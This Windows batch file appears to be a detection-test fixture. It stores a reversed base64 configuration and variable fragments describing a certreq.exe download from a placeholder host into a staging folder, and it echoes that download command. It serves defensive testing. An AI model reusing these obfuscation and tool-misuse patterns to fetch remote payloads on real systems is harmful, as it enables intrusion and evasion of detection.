@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|reverse
rem HUNTRESS-MATERIAL:dGFkLjhiNGEyZWE3NTEtZWdhdHNcYmFMc3NlcnRudUhcY2lsYnVQXHNyZXNVXDpDPWh0YXBfZWxpZnx0YWQuNTZiNDFjZjkvZGlsYXZuaS5lbHBtYXhlLjhiNGEyZWE3NTEvLzpzcHR0aD1scnV8OGI0YTJlYTc1MS1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3xlbm9uPWVnYXVnbmFsX3R4ZW58ZWdhdWduYWxfc3NvcmM9aHBhcmd8MT10bnVvY19lZ2F0c3xleGUucWVydHJlYz1yZXRwYWRhfGVsaWZfZXRpcncsZXRvbWVyX2VyaXVxY2E9c3BldHN8MT12
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "v_a0=v=1|steps=acquire_remote,write_file|adapter=certreq.exe|stage_c"
set "v_a1=ount=1|graph=cross_language|next_language=none|campaign_id=camp"
set "v_a2=aign-157ae2a4b8|url=https://157ae2a4b8.example.invalid/9fc14b65"
set "v_a3=.dat|file_path=C:\Users\Public\HuntressLab\stage-157ae2a4b8.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=903f7b90"
set "cfg=!v_a0!!v_a1!!v_a2!!v_a3!"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo certreq.exe acquire https://157ae2a4b8.example.invalid/9fc14b65.dat to C:\Users\Public\HuntressLab\stage-157ae2a4b8.dat
exit /b 0
